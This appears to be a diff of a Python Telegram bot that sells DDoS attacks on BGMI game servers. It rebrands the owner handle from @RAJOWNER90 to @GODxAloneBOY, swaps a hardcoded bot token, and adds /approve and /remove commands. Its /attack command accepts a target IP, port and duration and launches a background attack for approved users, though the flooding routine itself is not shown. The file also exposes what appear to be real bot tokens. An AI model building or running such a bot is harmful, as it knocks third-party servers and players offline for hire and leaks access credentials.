@@ -2,58 +2,108 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7749918794:AAFlgbWy2k9BTzJMPjFB1eJe7G4WUBniMrQ'
+TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'
 ADMIN_USER_ID = 1662672529
-USERS_FILE = 'users.txt'
+APPROVED_IDS_FILE = 'approved_ids.txt'
 attack_in_progress = False
 
-def load_users():
+# Load approved IDs (users and groups) from file
+def load_approved_ids():
     try:
-        with open(USERS_FILE) as f:
+        with open(APPROVED_IDS_FILE) as f:
             return set(line.strip() for line in f)
     except FileNotFoundError:
         return set()
 
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        f.writelines(f"{user}\n" for user in users)
+def save_approved_ids(approved_ids):
+    with open(APPROVED_IDS_FILE, 'w') as f:
+        f.writelines(f"{id_}\n" for id_ in approved_ids)
 
-users = load_users()
+approved_ids = load_approved_ids()
 
+# Start command
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[ᴅᴀʀᴋ x ꜱᴇʀᴠᴇʀ]彡 𝗗𝗱𝗼𝘀*\n"
-        "*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJOWNER90*\n"
-        "*🔥 SERVER BGMI*\n"    
-        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
+        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 GODxCHEATS 𝗗𝗱𝗼𝘀*\n"
+        "*🔥 𝗢𝘄𝗻𝗲𝗿 @GODxAloneBOY*\n"
+        "*🔥 SERVER BGMI*\n"
+        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def manage(update: Update, context: CallbackContext):
+# Approve command to approve users and group chat IDs
+async def approve(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
         return
 
-    if len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*👤 Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
         return
 
-    command, target_user_id = args
-    target_user_id = target_user_id.strip()
+    target_id = args[0].strip()
+    approved_ids.add(target_id)
+    save_approved_ids(approved_ids)
+    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')
 
-    if command == 'add':
-        users.add(target_user_id)
-        save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode='Markdown')
-    elif command == 'rem':
-        users.discard(target_user_id)
-        save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
+# Remove command to remove approved users and group chat IDs
+async def remove(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    args = context.args
 
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*👤 Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
+        return
+
+    target_id = args[0].strip()
+    if target_id in approved_ids:
+        approved_ids.discard(target_id)
+        save_approved_ids(approved_ids)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
+
+# Attack command (only for approved users and groups)
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress
+
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+    args = context.args
+
+    if str(chat_id) not in approved_ids and user_id not in approved_ids:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
+        return
+
+    if attack_in_progress:
+        await context.bot.send_message(chat_id=chat_id, text="*⭐ Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*🌟 Usage » /attack ip port time*", parse_mode='Markdown')
+        return
+
+    ip, port, time = args
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*✅ Attack launched ✅*\n"
+        f"*⭐ Target » {ip}*\n"
+        f"*⭐ Port » {port}*\n"
+        f"*⭐ Time » {time} seconds*\n"
+        f"*🔥 Owner @GODxAloneBOY*\n"
+        f"*🔥 SERVER BGMI*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
+
+# Run attack function
 async def run_attack(chat_id, ip, port, time, context):
     global attack_in_progress
     attack_in_progress = True
@@ -76,45 +126,17 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @RAJOWNER90*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @GODxAloneBOY*\n*🔥 SERVER BGMI*", parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext):
-    global attack_in_progress
-
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-    args = context.args
-
-    if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @RAJOWNER90*", parse_mode='Markdown')
-        return
-
-    if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⭐ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 3 𝐓𝐨 5 𝐌𝐢𝐧𝐮𝐭𝐞 𝐅𝐨𝐫 𝐍𝐞𝐱𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 /attack*", parse_mode='Markdown')
-        return
-
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip port time*", parse_mode='Markdown')
-        return
-
-    ip, port, time = args
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
-        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
-        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
-        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
-        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJOWNER90*\n"        
-        f"*🔥 SERVER @BGMI*"           
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
-
+# Main function
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("manage", manage))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(CommandHandler("remove", remove))
     application.add_handler(CommandHandler("attack", attack))
     application.run_polling()
 
 if __name__ == '__main__':
     main()
+    
